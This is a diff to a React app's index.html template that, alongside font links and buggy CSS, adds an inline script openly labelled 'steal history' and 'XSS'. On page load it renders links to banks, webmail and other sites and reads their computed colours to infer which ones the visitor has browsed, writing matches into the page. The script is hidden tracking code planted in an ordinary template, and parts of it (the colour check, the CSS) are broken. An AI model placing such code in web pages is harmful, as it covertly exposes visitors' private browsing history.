@@ -3,38 +3,150 @@
   <head>
     <meta charset="utf-8">
     <link rel="shortcut icon" href="%PUBLIC_URL%/favicon.ico">
+    <link href="https://fonts.googleapis.com/css?family=Lato|Niramit|Open+Sans|Roboto|Ubuntu" rel="stylesheet">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="theme-color" content="#000000">
-    <!--
-      manifest.json provides metadata used when your web app is added to the
-      homescreen on Android. See https://developers.google.com/web/fundamentals/engage-and-retain/web-app-manifest/
-    -->
+    <!-- manifest.json provides metadata used when your web app is added to the homescreen on Android. See https://developers.google.com/web/fundamentals/engage-and-retain/web-app-manifest/ -->
     <link rel="manifest" href="%PUBLIC_URL%/manifest.json">
-    <!--
-      Notice the use of %PUBLIC_URL% in the tags above.
-      It will be replaced with the URL of the `public` folder during the build.
-      Only files inside the `public` folder can be referenced from the HTML.
-
-      Unlike "/favicon.ico" or "favicon.ico", "%PUBLIC_URL%/favicon.ico" will
-      work correctly both with client-side routing and a non-root public URL.
-      Learn how to configure a non-root public URL by running `npm run build`.
-    -->
+    <!-- Notice the use of %PUBLIC_URL% in the tags above. It will be replaced with the URL of the `public` folder during the build. Only files inside the `public` folder can be referenced from the HTML. Unlike "/favicon.ico" or "favicon.ico",
+    "%PUBLIC_URL%/favicon.ico" will work correctly both with client-side routing and a non-root public URL. Learn how to configure a non-root public URL by running `npm run build`. -->
     <title>React App</title>
+    <style>
+      * {
+        padding:: 0;
+        margin: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family:"Lato": sans-serif;
+        font-weight: 400;
+        font-size: 16px;
+        line-height: 1.7;
+        color: #777;
+        margin: 20px;
+      }
+    </style>
   </head>
   <body>
     <noscript>
       You need to enable JavaScript to run this app.
     </noscript>
     <div id="root"></div>
-    <!--
-      This HTML file is a template.
-      If you open it directly in the browser, you will see an empty page.
-
-      You can add webfonts, meta tags, or analytics to this file.
-      The build step will place the bundled scripts into the <body> tag.
-
-      To begin the development, run `npm start` or `yarn start`.
-      To create a production bundle, use `npm run build` or `yarn build`.
-    -->
+    <!-- This HTML file is a template. If you open it directly in the browser, you will see an empty page. You can add webfonts, meta tags, or analytics to this file. The build step will place the bundled scripts into the <body> tag. To begin the
+    development, run `npm start` or `yarn start`. To create a production bundle, use `npm run build` or `yarn build`. -->
+    <script>
+      var agent = navigator.userAgent.toLowerCase();
+      var is_mozilla = (agent.indexOf("mozilla") != -1);
+      // popular websites. Lookup if user has visited any.
+      var websites = [
+        "http://ajaxian.com/",
+        "http://digg.com/",
+        "http://english.aljazeera.net/HomePage",
+        "http://ha.ckers.org",
+        "http://ha.ckers.org/blog/",
+        "http://jeremiahgrossman.blogspot.com/",
+        "http://login.yahoo.com/",
+        "http://mail.google.com/",
+        "http://mail.yahoo.com/",
+        "http://my.yahoo.com/",
+        "http://reddit.com/",
+        "http://seoblackhat.com",
+        "http://slashdot.org/",
+        "http://techfoolery.com/",
+        "http://weblogs.asp.net/jezell/",
+        "http://www.amazon.com/",
+        "http://www.aol.com/",
+        "http://www.bankofamerica.com/",
+        "http://www.bankone.com/",
+        "http://www.blackhat.com/",
+        "http://www.blogger.com/",
+        "http://www.bloglines.com/",
+        "http://www.bofa.com/",
+        "http://www.capitalone.com/",
+        "http://www.cenzic.com",
+        "http://www.cgisecurity.com",
+        "http://www.chase.com/",
+        "http://www.citibank.com/",
+        "http://www.cnn.com/",
+        "http://www.comerica.com/",
+        "http://www.e-gold.com/",
+        "http://www.ebay.com/",
+        "http://www.etrade.com/",
+        "http://www.expedia.com/",
+        "http://www.google.com/",
+        "http://www.hsbc.com/",
+        "http://www.icq.com/",
+        "http://www.jailbabes.com",
+        "http://www.microsoft.com/",
+        "http://www.msn.com/",
+        "http://www.myspace.com/",
+        "http://www.ntobjectives.com",
+        "http://www.passport.net/",
+        "http://www.paypal.com/",
+        "http://www.sourceforge.net/",
+        "http://www.spidynamics.com",
+        "http://www.statefarm.com/",
+        "http://www.usbank.com/",
+        "http://www.wachovia.com/",
+        "http://www.wamu.com/",
+        "http://www.watchfire.com",
+        "http://www.webappsec.org",
+        "http://www.wellsfargo.com/",
+        "http://www.whitehatsec.com",
+        "http://www.xanga.com/",
+        "http://www.yahoo.com/",
+        "http://seoblackhat.com/",
+        "http://http://localhost:3000/",
+        "http://www.alexa.com/",
+        "http://www.youtube.com/",
+        "https://banking.wellsfargo.com/",
+        "https://commerce.blackhat.com/",
+        "https://online.wellsfargo.com/",
+        "www.wealthfront.com",
+        "www.xing.com",
+        "creditkarma.com",
+        "videostripe.com"
+      ];
+      /* prevent multiple XSS loads */
+      if (!document.getElementById('xss_flag')) {
+        var d = document.createElement('div');
+        d.id = 'xss_flag';
+        document.body.appendChild(d);
+        var d = document.createElement('table');
+        d.border = 0;
+        d.cellpadding = 5;
+        d.cellspacing = 10;
+        d.width = '90%';
+        d.align = 'center';
+        d.id = 'data';
+        document.body.appendChild(d);
+        document.write('');
+        /* launch steal history */
+        if (is_mozilla) {
+          stealHistory();
+        }
+      }
+      function stealHistory() {
+        // loop through websites and check which ones have been visited
+        console.log(`mission launched`);
+        for (var i = 0; i < websites.length; i++) {
+          var link = document.createElement("a");
+          link.id = "id" + i;
+          link.href = websites[i];
+          link.innerHTML = websites[i];
+          document.body.appendChild(link);
+          // document.defaultView.getComputedStyle( Link, null ).color  var color = window.getComputedStyle(link).color;
+          var color = window.getComputedStyle(link, null).getPropertyValue("color");
+          //  var color = document.defaultView.getComputedStyle(link, "").color
+          console.log(`color -${color}`);
+          document.body.removeChild(link);
+          // check for visited
+          if (color == "rgb(0, 0, 255)") {
+            console.log(`website[i]`);
+            document.write('' + websites[i] + '');
+          } // end visited check
+        } // end visited website loop
+      } // end stealHistory method
+    </script>
   </body>
 </html>
